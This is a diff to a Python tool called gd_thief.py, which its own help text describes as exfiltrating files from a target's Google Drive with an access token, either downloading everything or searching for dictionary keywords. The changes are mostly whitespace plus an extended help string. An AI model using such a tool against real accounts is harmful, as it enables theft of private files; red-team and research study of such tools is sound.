@@ -121,7 +121,7 @@ def dictionary_search(path):
         print('[*] An Error occured opening the dictionary file: %s' % str(e))
         sys.exit(2)
     query_string = ""
-        
+
     for line in f:
             search_term = line.strip()
             query_string += "fullText contains \'" + search_term + "\' or "
@@ -177,13 +177,14 @@ def main():
     mode = ""
     thread = 1
     dict_path = ""
-    
+
     # usage
     usage = '\nusage: gd_thief.py [-h] -m [{dlAll, dlDict[-d <DICTIONARY FILE PATH>]}\n'
     usage += '\t[-t <THREAD COUNT>]'
     #help
     help = '\nThis Module will connect to Google\'s API using an access token and '
-    help += 'exfiltrate files\nfrom a target\'s Google Drive'
+    help += 'exfiltrate files\nfrom a target\'s Google Drive.  It will output exfiltrated '
+    help += 'files to the ./loot directory'
     help += '\n\narguments:'
     help += '\n\t-m [{dlAll, dlDict}],'
     help += '\n\t\t--mode [{dlAll, dlDict}]'
@@ -218,10 +219,10 @@ def main():
         print("\nMode  (-m, --mode) is a mandatory argument\n")
         print(usage)
         sys.exit(2)
-        
+
     # Build the GDrive Service
     service = build_service()
-    
+
     if mode == 'dlAll':
         print('[*] Scanning target G-Drive.  This could take a while...')
         filelist = list_files()
@@ -242,7 +243,7 @@ def main():
         print('\nInvalid argument (-m, --mode): %s\n' % mode)
         print(usage)
         sys.exit(2)
-    
+
     q = Queue()
     print('[*] Downloading Files...')
     for x in range(int(thread)):
@@ -254,6 +255,6 @@ def main():
     q.join()
     print('[*] Drive download complete.')
     exit(0)
-    
+
 if __name__ == '__main__':
     main()
